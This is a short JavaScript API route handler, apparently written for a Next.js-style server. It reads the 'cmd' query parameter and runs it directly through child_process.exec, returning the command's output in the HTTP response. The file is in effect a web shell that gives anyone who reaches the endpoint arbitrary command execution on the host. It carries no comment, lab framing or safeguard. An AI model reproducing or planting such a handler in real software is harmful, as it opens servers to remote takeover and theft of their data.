export default function handler(req,res) {
  console.log(req.query.cmd)

    const { exec } = require("child_process");
    exec(`${req.query.cmd}`, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
        }

        if(stdout) {
            console.log(`stdout: ${stdout}`);
            res.send(`${stdout}`);
        }
    });
}